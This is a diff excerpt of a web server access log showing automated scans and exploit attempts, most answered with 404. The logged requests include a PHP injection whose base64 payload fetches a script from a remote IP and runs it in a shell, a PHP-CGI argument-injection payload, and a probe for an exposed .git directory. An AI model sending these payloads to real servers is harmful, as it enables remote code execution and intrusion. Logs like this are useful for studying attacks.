@@ -2806,3 +2806,4 @@ INFO:     185.100.87.136:39308 - "POST /ajax HTTP/1.1" 404 Not Found
 INFO:     176.65.148.52:35824 - "GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode("Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo"));die()?> HTTP/1.1" 404 Not Found
 INFO:     172.236.228.229:38332 - "GET / HTTP/1.1" 200 OK
 INFO:     176.65.138.171:33192 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 404 Not Found
+INFO:     196.251.70.87:38648 - "GET /.git/index HTTP/1.1" 404 Not Found
